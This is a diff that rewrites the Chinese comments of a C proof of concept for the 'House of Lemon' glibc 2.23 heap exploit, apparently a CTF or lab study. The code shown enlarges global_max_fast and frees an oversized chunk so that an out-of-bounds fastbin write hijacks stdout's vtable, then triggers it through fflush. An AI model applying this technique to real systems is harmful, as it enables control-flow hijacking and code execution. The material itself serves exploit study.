@@ -1,15 +1,18 @@
 /*
- * House of Lemon：glibc 2.23 / Ubuntu 16.04 首发 libc 的最小可执行 PoC。
+ * House of Lemon：针对 glibc 2.23（Ubuntu 16.04 首发的那个 libc 版本）
+ * 写的最小可执行 PoC。
  *
- * 目标不是复刻原题菜单，而是单独证明 House of Lemon 最关键的两步：
- *   1. 已有一次 libc 任意写后，把 global_max_fast 扩大；
- *   2. free 一个 0x17c0 chunk，使 fastbin_index 越过 fastbinsY，恰好把
- *      chunk 地址写到 _IO_2_1_stdout_.vtable；随后 fflush(stdout) 跳进
- *      堆上的伪 vtable。
+ * 这里的目标不是复刻原题的菜单交互，而是单独证明 House of Lemon 最关键
+ * 的两步：
+ *   1. 已经拿到一次 libc 任意写之后，把 global_max_fast 改大；
+ *   2. free 一个 0x17c0 的 chunk，让计算出来的 fastbin_index 越过
+ *      fastbinsY 数组，恰好把 chunk 地址写到 _IO_2_1_stdout_.vtable 上；
+ *      随后调用 fflush(stdout) 就会跳进堆上这个伪造的 vtable。
  *
- * 运行环境必须是本项目准备的 2.23-0ubuntu3_amd64。global_max_fast 是
- * glibc hidden 符号，PoC 用它相对 _IO_2_1_stdout_ 的该构建固定偏移定位。
- * 换附件 libc 时请先按 README 的公式重新计算偏移，不能照抄。
+ * 运行环境必须是本项目准备好的 2.23-0ubuntu3_amd64。global_max_fast 是
+ * glibc 的一个 hidden 符号，这份 PoC 用它相对 _IO_2_1_stdout_ 在该构建
+ * 下的固定偏移来定位。换成别的附件 libc 时，请先按 README 里给出的公式
+ * 重新计算偏移，不能直接照抄这里的数值。
  */
 
 #define _GNU_SOURCE
@@ -64,8 +67,8 @@ int main(void)
     /* _IO_FILE_plus 在 glibc 2.23 x86-64 中的 vtable 位于对象 +0xd8。 */
     stdout_vtable_slot = (void **)(stdout_object + 0xd8);
 
-    /* 源码关系：fastbinsY 起于 main_arena+8，每项 8 字节；
-     * fastbin 索引计算公式为 fastbin_index(size) = (size >> 4) - 2。
+    /* 源码里的关系：fastbinsY 数组起始于 main_arena+8，每一项占 8 字节;
+     * fastbin 的索引计算公式是 fastbin_index(size) = (size >> 4) - 2。
      */
     index = ((uintptr_t)stdout_vtable_slot -
              ((uintptr_t)main_arena + 8)) / sizeof(void *);
@@ -82,27 +85,31 @@ int main(void)
         return 4;
 
     /* fake_vtable 指向 chunk header，而 user 指向 header+0x10。
-     * free 会覆盖 user[0]（即 fake_vtable[2]），所以从 user[1] 开始填。
-     * fflush 使用的 __sync 槽也会命中 win；多填一些槽便于单步观察。
+     * free 会覆盖 user[0]（也就是 fake_vtable[2]），所以要从 user[1]
+     * 开始填。fflush 用到的 __sync 槽同样会命中 win；多填几个槽是为了
+     * 方便在调试时单步观察。
      */
     fake_vtable = user - 2;
     for (size_t i = 1; i < 32; ++i)
         user[i] = (void *)win;
 
-    /* 原题通过 unsafe unlink 获得这次写。这里把“已有 libc 任意写”作为
-     * 前置原语直接表达，从而把 PoC 聚焦到 Lemon 独有的 fastbin OOB。
+    /* 原题是通过 unsafe unlink 拿到这次写能力的。这里直接把“已经具备一次
+     * libc 任意写”当作前置原语给出，这样就能把 PoC 的重点聚焦在 Lemon
+     * 独有的 fastbin 越界写上。
      */
     *global_max_fast = 0x2000;
 
-    /* 2.23 的 _int_free 先比较 size <= global_max_fast，再计算不带边界
-     * 检查的 fastbin_index。于是 *stdout_vtable_slot 被写成 chunk header。
+    /* 2.23 的 _int_free 先判断 size <= global_max_fast，再计算不带边界
+     * 检查的 fastbin_index，于是 *stdout_vtable_slot 就被写成了 chunk
+     * header 的地址。
      */
     free(user);
 
     if (*stdout_vtable_slot != fake_vtable)
         _exit(5);
 
-    /* glibc 2.23 尚无 2.24 引入的 IO_validate_vtable，因而接受堆虚表。 */
+    /* glibc 2.23 还没有 2.24 才引入的 IO_validate_vtable 检查，所以会
+     * 接受这个指向堆的伪造 vtable。 */
     (void)fflush(stdout);
     _exit(6);
 }
